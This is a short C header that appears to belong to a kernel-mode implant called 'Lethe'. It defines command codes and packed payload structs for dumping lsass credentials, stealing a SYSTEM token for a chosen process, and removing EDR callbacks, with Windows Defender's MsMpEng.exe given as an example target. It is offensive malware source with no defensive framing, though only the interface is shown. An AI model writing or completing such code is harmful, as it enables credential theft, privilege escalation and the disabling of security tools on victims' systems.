#pragma once

//Commands
#define LETHE_CMD_PING       0x01
#define LETHE_CMD_CREDDUMP   0x02   //dump lsass from kernel
#define LETHE_CMD_TOKENSTEAL 0x03   //copy SYSTEM token to target pid
#define LETHE_CMD_KILLEDR    0x04   //remove EDR process callbacks

#pragma pack(push, 1)
typedef struct _LETHE_MSG_HEADER {
    UCHAR  Command;
    ULONG  PayloadLength;
} LETHE_MSG_HEADER;
#pragma pack(pop)

//TokenSteal payload, just needs a target PID
#pragma pack(push, 1)
typedef struct _LETHE_TOKEN_PAYLOAD {
    ULONG TargetPid;
} LETHE_TOKEN_PAYLOAD, *PLETHE_TOKEN_PAYLOAD;
#pragma pack(pop)

//KillEDR payload, target process name
#pragma pack(push, 1)
typedef struct _LETHE_EDR_PAYLOAD {
    WCHAR ProcessName[64];   // e.g. L"MsMpEng.exe"
} LETHE_EDR_PAYLOAD, *PLETHE_EDR_PAYLOAD;
#pragma pack(pop)